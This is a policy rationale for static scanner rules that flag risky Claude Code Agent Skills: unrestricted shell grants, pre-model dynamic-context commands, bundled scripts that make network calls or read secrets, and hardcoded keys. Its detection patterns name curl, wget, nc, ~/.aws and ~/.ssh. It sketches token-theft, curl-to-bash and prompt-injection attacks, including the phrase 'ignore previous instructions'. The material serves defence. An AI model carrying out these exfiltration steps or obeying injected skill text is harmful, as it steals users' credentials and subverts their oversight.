---
policy_id: claude_skill_safety
category: claude_skill
topic: skill_safety
rules:
  - id: CSKILL-001
    severity: high
    confidence: 0.9
    scope: skill
    fix_type: config
  - id: CSKILL-002
    severity: high
    confidence: 0.9
    scope: skill
    fix_type: config
  - id: CSKILL-003
    severity: critical
    confidence: 0.85
    scope: skill
    fix_type: config
  - id: CSKILL-010
    severity: high
    confidence: 0.7
    scope: skill
    fix_type: code
  - id: CSKILL-011
    severity: critical
    confidence: 0.8
    scope: skill
    fix_type: code
  - id: CSKILL-030
    severity: high
    confidence: 0.85
    scope: skill
    fix_type: code
  - id: CSKILL-020
    severity: medium
    confidence: 0.7
    scope: skill
    fix_type: config
  - id: CSKILL-040
    severity: medium
    confidence: 0.6
    scope: skill
    fix_type: config
  - id: CSKILL-050
    severity: high
    confidence: 0.8
    scope: skill
    fix_type: config
  - id: CSKILL-060
    severity: medium
    confidence: 0.5
    scope: skill
    fix_type: config
  - id: CSKILL-070
    severity: low
    confidence: 0.9
    scope: skill
    fix_type: config
  - id: CSKILL-061
    severity: low
    confidence: 0.7
    scope: skill
    fix_type: config
  - id: CSKILL-071
    severity: low
    confidence: 0.6
    scope: skill
    fix_type: config
references: [LLM01, LLM02, LLM03, LLM06, AST03, AST04, AST05, AST08, ASI04]
---

# Policy Rationale: Agent Skill Safety

**Policy ID:** `claude_skill_safety`  
**File:** `claude_skill/skill_safety.yaml`  
**Rules:** CSKILL-001, CSKILL-002, CSKILL-003, CSKILL-010, CSKILL-011, CSKILL-030, CSKILL-020, CSKILL-040, CSKILL-050, CSKILL-060, CSKILL-070, CSKILL-061, CSKILL-071  
**Severities:** high, high, critical, high, critical, high, medium, medium, high, medium, low, low, low  
**Fix types:** config (SKILL.md edits) + code (bundled-file edits for CSKILL-010/011/030)  
**References:** OWASP LLM Top 10:2025 — LLM01, LLM02, LLM03, LLM06 · OWASP Agentic Skills Top 10 — AST03, AST04, AST05, AST08 · OWASP ASI — ASI04

> Bundled-file content analysis ships (CSKILL-010/011: egress + credential reads;
> CSKILL-030: a committed secret), and CSKILL-060 catches the explicit
> description-vs-capability mismatch (a read-only *claim* contradicted by
> side-effecting grants). The broader heuristic — judging an implicitly
> read-only-*sounding* description with no explicit claim — remains future work.

---

## What this policy covers

Claude Code **Agent Skills** — `SKILL.md` folders discovered at any depth
(`.claude/skills/<name>/SKILL.md`, personal `~/.claude/skills/`, plugin
`skills/`, and the merged `.claude/commands/*.md` form). These rules fire per
skill (`scope: skill`) against the parsed frontmatter and the markdown body, via
predicates over the discovered `SkillDef`. Because the surface is markdown, the
rules carry no `language:` field and fire regardless of the surrounding codebase.

A skill is a uniquely potent supply-chain surface: its `description` is **always
loaded into Claude's context**, its body loads on trigger, and it can carry
auto-approved tool grants, bundled executable scripts, and — in Claude Code —
**dynamic-context shell commands that run before the model ever sees the
skill**. Empirical study of public skill marketplaces (Snyk ToxicSkills, 2026)
found a security flaw in roughly a third of skills, with script-bundling skills
markedly worse than instruction-only ones. Skills are third-party code you
execute; most of the rules below flag the patterns that make a skill dangerous
on activation. CSKILL-070, CSKILL-061, and CSKILL-071 are a separate
low-severity tier — skill-metadata and portability hygiene checks (a missing
description, a redundant tool grant, an undocumented agent binding) that make a
skill harder to review or reuse safely, without themselves being an attack
surface.

**Standards mapping.** These rules map to the **OWASP Agentic Skills Top 10**
(AST): over-privileged grants (**AST03**); metadata that misrepresents capability
— hidden-Unicode/base64 instructions and read-only claims that don't match the
grants (**AST04**); and prompt-injection via skill content (**AST05**), with an
ASI cross-reference (**ASI04**). The pack is itself Trustabl's deterministic
answer to **AST08 (Poor Scanning)** — the AI-specific, static, no-network skill
analysis that AST08 observes traditional tools lack. We cite the taxonomy IDs
only; every consequence a rule names is argued from mechanism below, not from any
external incident claim.

---

## Why skill frontmatter and body are a distinct concern

Two Claude Code mechanics make a skill more dangerous than ordinary prose:

1. **`allowed-tools` is auto-approval, not a sandbox.** Claude Code docs are
   explicit: while a skill is active, `allowed-tools` grants the listed tools
   *without prompting* — it does not restrict the tool pool. `allowed-tools:
   Bash(*)` therefore auto-runs any shell command. (OWASP LLM06, excessive
   agency.)

2. **Dynamic-context injection runs pre-model.** A `` !`<command>` `` line or a
   ` ```! ` fenced block in `SKILL.md` is executed *during preprocessing, before
   the rendered skill reaches the model* — "this is preprocessing, not something
   Claude executes." Model-level prompt-injection defenses never see it; "the
   model may later refuse to continue, but by then the command has already
   executed." A dynamic-context command that reads a credential and POSTs it to
   an external host completes the exfiltration during skill load. (LLM01 +
   LLM02.)

On top of these, a skill's always-loaded `description` and on-trigger body are a
prompt-injection channel (LLM01), and external URLs in the body pull
attacker-controllable content into the loop (LLM01) and double as exfiltration
endpoints. Skills spread by sharing and forking (LLM03, supply chain), so an
over-privileged template propagates its blast radius wherever it is reused.

**CSKILL-070/061/071 are a different kind of concern: metadata quality and
reusability, not attack surface.** None of the three widen what a skill can do
— a missing description grants no new tool, a duplicate `allowed-tools` entry
grants no new tool, and an `agent:` binding doesn't itself execute anything.
What they degrade is the human and model *review* process the rest of this
policy assumes works: CSKILL-070's `description` is the field CSKILL-060 relies
on a user reading to catch a capability mismatch — if it's empty, there is
nothing to check the grants against, and Claude has no signal to decide whether
invoking the skill is appropriate. CSKILL-061's duplicate grant doesn't expand
capability, but it clutters the exact list CSKILL-001/050 ask a reviewer to
scope down, making an already-broad `allowed-tools` line harder to audit at a
glance. CSKILL-071's agent binding doesn't run code, but it hides a coupling —
the skill silently inherits whichever trust and guardrail assumptions the named
agent carries — that a reviewer evaluating the skill in isolation would miss.
They are graded `low` accordingly: none is exploitable on its own, so they sit
beneath every security-focused rule in this pack, including CSKILL-040's
`medium` review nudge.

---

## Rule-by-rule defense

### CSKILL-001 — Skill auto-approves unrestricted shell (Severity: high, Confidence: 0.9, Fix type: config)

**What we detect:** `allowed-tools` grants unrestricted shell — a bare `Bash`
token or a wildcard `Bash(*)` / `Bash(:*)` (`skill_allows_unrestricted_shell`).

**Why it is flaggable:** `allowed-tools` is an auto-approval list, not a
sandbox (per the Claude Code docs: tools the skill lists run "without asking
permission when this skill is active", and the docs' own guidance warns
"a skill can grant itself broad tool access"). An unrestricted `Bash` grant
means that while the skill is active, any shell command — including one
steered by injected content the skill reads — runs with no per-command
approval, and the grant covers far more than the commands the skill needs.
The docs' own example scopes grants (`Bash(git add *) Bash(git commit *)`),
which is exactly the fix.

**Real-world consequence:** A workflow skill shipping a bare `Bash` grant is
activated (by the user's slash command, or by Claude itself when the skill
looks relevant — model invocation is on by default); mid-skill, injected
instructions in a file it reads run arbitrary commands silently.

**Why high (recalibrated from critical, 2026-07):** the grant is bounded in
ways critical should respect — it applies only while the skill is active,
only after the workspace/plugin trust dialog, and a skill cannot change
permission modes or set bypass flags. Exploitation therefore needs an active
skill plus a steering vector; that is a serious weakened-control finding, not
an unattended input-to-impact path. Critical in this pack is reserved for the
genuinely pre-model/unattended patterns (CSKILL-003's load-time
egress+secrets, CSKILL-011's credential-reading bundled scripts). Real-world
pushback (a maintainer of an 86-skill plugin, 2026-07) correctly noted the
old "runs without user intervention" framing overstated the mechanism; what
survives that rebuttal is least-privilege (scope the grant) plus the fact
that model invocation is on by default — the user-invocation gate the
by-design argument relies on is not actually set unless
`disable-model-invocation: true` is (CSKILL-050's territory).

**Confidence 0.9:** the grant is read directly from frontmatter, so detection
itself has no false positives; the residual judgment gap is a skill that
genuinely needs broad shell (a build runner), which should still scope its
grants — and workflow ecosystems where bare `Bash` is the norm, where the
finding is real but reads as noise at volume.

### CSKILL-002 — Skill runs shell during load, dynamic-context execution (Severity: high, Confidence: 0.9, Fix type: config)

**What we detect:** The body contains dynamic-context execution — inline
`` !`cmd` `` or a ` ```! ` block (`skill_body_has_dynamic_exec`).

**Why it is flaggable:** These commands run pre-model. Whatever they do has
already happened before Claude — or its injection defenses — can weigh in.

**Real-world consequence:** A skill that inlines `` !`gh pr diff` `` is benign;
the same mechanism with a side-effecting or data-reading command is not, and the
two are indistinguishable to the model because neither reaches it as a tool call.

**Why high (not critical):** Presence of dynamic-context execution is a strong
risk signal but not proof of harm (read-only uses exist) — CSKILL-003 escalates
the egress/secret case to critical. Confidence 0.9: the grammar match is precise.

### CSKILL-003 — Dynamic-context command performs network egress or reads secrets (Severity: critical, Confidence: 0.85, Fix type: config)

**What we detect:** A dynamic-context command matches network egress
(`curl`/`wget`/`nc`/…) or credential/secret access (`gh auth`, `$AWS_*`,
`~/.aws`, `~/.ssh`, `id_rsa`, `*_key`, …) (`skill_dynamic_exec_touches_network_or_secrets`).

**Why it is flaggable:** This is the pre-model exfiltration primitive: a secret
is read, or data is shipped out, during skill load — before any review.

**Real-world consequence:** The documented "Clawsights"-style attack —
`` !`gh auth token` `` paired with a `` !`curl attacker` `` — harvests a token
and exfiltrates it at activation, fully outside the model's view.

**Why critical:** Confidentiality impact realized before any gate, via a
mechanism designed to be invisible to the model. Confidence 0.85 (below 001):
the egress/secret heuristic can match a legitimate read-only command, so a
small false-positive margin is priced in.

### CSKILL-010 — Bundled skill script performs network egress (Severity: high, Confidence: 0.7, Fix type: code)

**What we detect:** A script bundled in the skill's directory (a `.sh`/`.py`/…
file the skill can run via Bash) makes outbound network calls — `curl`/`wget`/
`nc`/… — found by reading the script's **content**, not just inventorying its
path (`skill_bundled_script_network_egress`).

**Why it is flaggable:** Body-only scanners read `SKILL.md` and miss payloads
parked in an auxiliary or "test" file. A bundled `curl … | bash` loads and runs
remote code on activation; paired with credential access in the same script it
becomes data exfiltration.

**Real-world consequence:** The Snyk/VentureBeat "test-file bypass" — a skill
whose `SKILL.md` looks benign but whose `scripts/setup.sh` pipes a remote script
into a shell, executed with the user's privileges the moment the skill runs.

**Why high / confidence 0.7:** Egress in a bundled script is a strong signal but
not proof of harm (a script may legitimately fetch a pinned dependency), so it is
high rather than critical, with a confidence that prices in benign installers.

### CSKILL-011 — Bundled skill script reads credentials or secrets (Severity: critical, Confidence: 0.8, Fix type: code)

**What we detect:** A bundled script reads credentials or secrets — `gh auth`,
`$AWS_*`, `~/.aws`, `~/.ssh`, `id_rsa`, `*_key`, … — detected by reading the
script body (`skill_bundled_script_reads_secrets`).

**Why it is flaggable:** A skill runs its bundled scripts, so a credential read
hidden outside `SKILL.md` is a theft primitive that body-only scanning never
sees. Combined with a network call in the same script (CSKILL-010) it is direct
credential exfiltration.

**Real-world consequence:** A "sync auth" helper whose bundled script reads
`~/.aws/credentials` and base64-encodes it into a `curl` query string — exactly
the aux-file payload competitor tools demonstrably miss.

**Why critical:** Confidentiality impact (credential theft) realized on
activation and hidden from review. Confidence 0.8: the secret-read heuristic can
match a legitimate credential-management script, so a small false-positive margin
is priced in below the auto-shell rules.

### CSKILL-030 — Bundled skill file contains a hardcoded secret (Severity: high, Confidence: 0.85, Fix type: code)

**What we detect:** A non-binary bundled file contains a hardcoded secret literal
— a recognizable provider token (AWS `AKIA…`, GitHub `ghp_…` / `github_pat_…`,
Slack `xox…`, Google `AIza…`), an OpenAI-style `sk-…` key, or a private-key
header — matched by format/context, not entropy
(`skill_bundled_file_has_hardcoded_secret`).

**Why it is flaggable:** A credential committed into a skill ships to everyone
who installs or forks it, lives forever in the repository's history, and is
trivially harvested by anyone scraping public repos. This is distinct from
CSKILL-011 (a script that *reads* a secret at runtime): here the secret *is* the
file's content.

**Real-world consequence:** A skill that bundles a `config/*.env` or
`credentials` file with a live AWS key — the secret is exposed the moment the
skill is published, independent of whether the skill ever runs.

**Why high / confidence 0.85:** A committed live credential is a real exposure,
but a match can be a revoked or example key, so it is high rather than critical —
yet the provider-prefix / key-header formats are distinctive enough that
confidence sits above the heuristic rules. Format/context over entropy keeps
false positives near zero; the trade-off is missing custom or high-entropy
secrets with no recognizable prefix.

### CSKILL-020 — Skill fetches untrusted external content (Severity: medium, Confidence: 0.7, Fix type: config)

**What we detect:** The body references an external `http(s)` URL
(`skill_references_external_url`).

**Why it is flaggable:** Fetched external content is an indirect-injection vector
(LLM01) and the URL is a candidate exfiltration endpoint; external dependencies
can also change after review.

**Why medium / confidence 0.7:** Many legitimate skills cite a doc URL, so URL
presence alone is a review prompt, not a verdict — hence medium and a confidence
that admits frequent benign matches.

### CSKILL-040 — Skill body contains prompt-injection markers (Severity: medium, Confidence: 0.6, Fix type: config)

**What we detect:** Instruction-override phrasing ("ignore previous
instructions"), invisible Unicode used to smuggle hidden text (zero-width
characters, the Unicode Tags block U+E0000–E007F, or bidirectional overrides), or
a long base64 blob (`skill_body_has_injection_marker`).

**Why it is flaggable:** The description and body enter Claude's context, so an
injected instruction here can hijack the agent (LLM01) — including one a human
reviewer literally cannot see. Invisible-Unicode smuggling (Tags-block "ASCII
smuggling", Trojan-Source bidi overrides) and base64 blobs have no legitimate
place in skill prose.

**Why medium / confidence 0.6:** The heuristics are deliberately broad and
FP-prone (a base64 data sample, a doc *about* prompt injection) — the lowest
confidence in the pack, shipped as a review nudge, not an assertion.

### CSKILL-050 — Model-invocable skill grants side-effecting tools (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:** The skill is model-invocable (no `disable-model-invocation`)
**and** pre-approves a side-effecting tool — `Bash`/`Write`/`Edit`/`WebFetch`/
`NotebookEdit` (`all` of `skill_model_invocable` + `skill_allows_tool`).

**Why it is flaggable:** Claude can trigger the skill on its own — steered by an
ambiguous request or an injected instruction — and the skill's auto-approved
tools then act without the user choosing to (LLM06).

**Why high / confidence 0.8:** Two conditions must hold, so the match is
specific; the residual gap is a skill that legitimately wants model invocation
*and* a write tool (rare for a safe design).

### CSKILL-060 — Skill description claims read-only but grants side-effecting tools (Severity: medium, Confidence: 0.5, Fix type: config)

**What we detect:** The description explicitly claims to be read-only or
side-effect-free (e.g. "read-only", "does not modify", "cannot run commands")
while `allowed-tools` pre-approve a side-effecting tool — Bash / Write / Edit /
WebFetch / NotebookEdit, or unrestricted shell (`skill_description_tool_mismatch`).

**Why it is flaggable:** The description is the metadata a user reads to decide
whether to trust a skill — OWASP Agentic Skills Top 10 **AST04 (Insecure
Metadata)**: metadata that misrepresents capability. A read-only claim
contradicted by a side-effecting grant is a deception the reviewer cannot see
from the description alone, and the grant itself is over-privilege (**AST03**).

**Why medium / confidence 0.5:** Deliberately narrow — it fires only on an
explicit read-only *claim* contradicted by a real grant, not on every
benign-sounding description — but the read-only-claim regex is a heuristic that
can match incidental phrasing, so it ships at the pack's lowest confidence as a
review nudge. The broader "implicitly read-only-sounding" case is out of scope.

### CSKILL-070 — Skill is missing a description (Severity: low, Confidence: 0.9, Fix type: config)

**What we detect:** The skill's `description` frontmatter field is absent or
blank after trimming whitespace (`skill_has_description: false`).

**Why it is flaggable:** A skill's `description` is the one field guaranteed to
enter Claude's context regardless of whether the skill ever triggers, and it is
the only thing a user sees when deciding whether to install one. With it empty,
CSKILL-060's description-vs-grants check has nothing to compare against, Claude
has no basis for choosing to invoke the skill over another, and a human
reviewer has no summary to start from — they have to read the full body and
every bundled file cold.

**Real-world consequence:** A skill shipped with `name:` set but no
`description:` line sits in a shared `.claude/skills/` directory alongside
dozens of others; neither the model nor a teammate scanning the list can tell
what it does without opening the file, so it either gets ignored or invoked on
a guess.

**Why low (not medium):** A missing description degrades review, but it grants
nothing and executes nothing on its own — it is strictly weaker than every
rule above it, none of which requires anything else to be true to matter.

**Confidence 0.9:** The check is a direct presence test on one frontmatter
field with no pattern matching involved, so it has no realistic false-positive
surface — a description is either present or it isn't. The only judgment call
priced in is one of scope, not accuracy: CSKILL-070 does not evaluate whether a
*present* description is any good (see "What this policy does not cover"
below).

### CSKILL-061 — Skill allowed-tools list has duplicate tool references (Severity: low, Confidence: 0.7, Fix type: config)

**What we detect:** The same normalized token appears more than once in
`allowed-tools` — case-insensitive, whitespace-trimmed exact match
(`skill_has_duplicate_tool_refs: true`).

**Why it is flaggable:** A duplicate entry grants nothing an author didn't
already grant once; its cost is purely to review. `allowed-tools` is the list a
reviewer reads to understand exactly what a skill is authorized to do (per
CSKILL-001/050's least-privilege guidance), and a repeated entry is noise in
that list — evidence the grants were edited by hand or merged from multiple
sources without cleanup, which is itself a weak signal the rest of the list may
be stale too.

**Real-world consequence:** A skill's `allowed-tools` accretes entries across
several PRs — `Bash(git diff *)` is added twice by two contributors who didn't
check the existing list — and a reviewer scanning it either double-counts the
grant's intent or has to stop and diff the list by hand to confirm nothing else
is duplicated.

**Why low:** Redundant, not over-privileged — the skill's actual capability is
identical with or without the duplicate, so this carries none of the
capability-expansion risk CSKILL-001/050 flag.

**Confidence 0.7 — substantive gap, not a rounding choice:** The match is exact
string comparison after normalizing case and whitespace, which means it never
flags two entries that merely *look* related but differ in scope — `Bash` and
`Bash(git *)` are two different grants (the second is strictly narrower), not a
duplicate, and the predicate correctly leaves that pair alone. That precision
cuts the other way, though: it also means CSKILL-061 misses the more common
real-world case of redundant *coverage* — `Bash(*)` and `Bash(git *)` together,
where the second entry adds nothing because the first already subsumes it, but
the strings differ so no duplicate is reported. The rule catches literal
copy-paste repeats reliably; it does not reason about which grants overlap in
effect, so confidence sits at 0.7 to reflect that narrower, syntactic scope
rather than any risk of misfiring on the cases it does catch.

### CSKILL-071 — Skill is bound to a single agent, reducing portability (Severity: low, Confidence: 0.6, Fix type: config)

**What we detect:** The skill's `agent:` frontmatter field is set to a non-empty
value (`skill_is_agent_specific: true`).

**Why it is flaggable:** An `agent:`-bound skill is written against one
sub-agent's tool access, permission mode, and behavioral assumptions rather
than being reusable as-is. Reviewing it in isolation is misleading — its actual
risk profile depends on the agent it's coupled to — and forking or reusing it
elsewhere silently carries that coupling along unless the new context happens
to match.

**Real-world consequence:** A skill written and tested only against a
locked-down `Explore`-style read-only agent is copied into a project and
invoked from a general-purpose agent with broader grants; the skill's
instructions assume constraints (e.g. "no writes possible") that no longer
hold, because the binding — and the assumption behind it — wasn't visible from
the skill file alone.

**Why low:** The binding is declarative metadata, not a grant or an executable
statement — it changes nothing about what the skill can do on its own; it only
changes how safely its risk can be assessed out of context.

**Confidence 0.6 — substantive gap, not a rounding choice:** The predicate
checks only the `agent:` field, not the related `context:` field — a skill
that sets `context: fork` without also naming an `agent:` is not flagged, even
though it is arguably the same portability concern (see "What this policy does
not cover"). In the other direction, the predicate cannot tell an intentional,
documented coupling from an accidental one: a skill whose description says "for
use with the Explore agent only" and one that binds `agent: Explore` with no
explanation both fire identically. The rule's own `explanation` text calls out
"context: fork / agent: <name>" as the pattern to watch for, but only the
latter half is actually checked — that gap between the documented concern and
the narrower implemented check is what confidence 0.6 prices in.

---

## What this policy does not cover (v1)

- **The "by-design plugin" trust argument.** A maintainer can reasonably reply
  that a bare `Bash` grant is required for the skill to function, that the
  grant only suppresses prompts while a user-chosen skill is active, and that
  a skill cannot set permission modes — all true (and why CSKILL-001 is high,
  not critical). The rule still stands on two legs the rebuttal does not
  cover: (1) least-privilege — a scoped grant (`Bash(<tool> *)`) keeps the
  skill working while auto-approving only its own commands; (2) the
  user-invocation gate is off by default — Claude can auto-load a skill it
  judges relevant unless `disable-model-invocation: true` is set, which
  side-effecting skills rarely set (CSKILL-050 fires for that pairing).
  Outreach and report copy must not paraphrase this rule as "runs without
  user intervention"; the shipped explanation text is the accurate framing.
- **Bundled-script risks beyond egress/secret-read.** CSKILL-010/011 now read
  bundled scripts for network egress and credential reads, but other in-script
  risks (destructive filesystem ops, obfuscated/encoded payloads that evade the
  regex) are not yet modeled.
- **Secrets in `SKILL.md` itself, or in unrecognized formats.** CSKILL-030 scans
  bundled-file content for known provider-token / private-key formats; a secret
  literal in the `SKILL.md` body, or a custom/high-entropy secret with no
  recognizable prefix, is not yet flagged.
- **Implicit description-vs-capability mismatch.** CSKILL-060 catches an
  *explicit* read-only claim contradicted by side-effecting grants; judging an
  implicitly read-only-*sounding* description (with no explicit claim) against
  its grants is heuristic and FP-prone, and remains deferred.
- **Obfuscated payloads** — aliased/encoded dynamic-context commands evade the
  egress/secret regex; a determined attacker can hide intent.
- **Whether `disableSkillShellExecution` is set** in managed settings (which
  would neutralize the dynamic-context rules) — a possible false positive the
  static check cannot see.
- **Runtime-fetched remote instructions** — the rules see the fetch (CSKILL-020),
  not the payload, which can change after review.
- **Description quality.** CSKILL-070 checks only that `description` is
  non-blank; a one-word or misleading description passes with the same result
  as a precise, useful one. Judging description accuracy against the skill's
  actual body and grants is a harder, more subjective check and is out of
  scope for v1.
- **Semantically overlapping tool grants.** CSKILL-061 flags exact, normalized
  duplicate entries in `allowed-tools`; it does not detect redundant coverage
  between differently-scoped entries (`Bash(*)` alongside `Bash(git *)`), which
  requires parsing and comparing the tool-pattern grammar rather than string
  equality.
- **Intentional vs. accidental agent binding.** CSKILL-071 fires on any
  non-empty `agent:` field; it does not distinguish a documented, deliberate
  coupling from an accidental one, and it does not fire on `context: fork` set
  without a named `agent:`, even though that carries a related portability
  concern.

---

## Recommendations beyond the fix

```yaml
---
name: summarize-changes
description: Summarize uncommitted changes. Read-only; cannot run commands.
allowed-tools: Read Grep Bash(git diff *) Bash(git status *)
disable-model-invocation: true
---

Summarize the working-tree changes and flag anything risky.
```

1. **Least privilege:** enumerate exact commands in `allowed-tools`
   (`Bash(git diff *)`), never `Bash(*)`; prefer read-only tools.
2. **No pre-model side effects:** keep dynamic-context `` !`…` `` to read-only,
   side-effect-free data; never read credentials or hit the network there.
3. **Gate auto-invocation:** set `disable-model-invocation: true` on any skill
   that carries side effects, so only the user can trigger it.
4. **Treat skills as third-party code:** review `SKILL.md` and every bundled file
   before trusting a repo; for untrusted environments, set
   `disableSkillShellExecution: true` in managed settings.
5. **Keep metadata honest and clean:** the example above already reflects this —
   a real `description:` (CSKILL-070), no repeated entries in `allowed-tools`
   (CSKILL-061), and no `agent:` binding since this skill is meant to be
   reusable across agents (CSKILL-071). If a skill genuinely is agent-specific,
   say so in the description rather than leaving the coupling implicit.
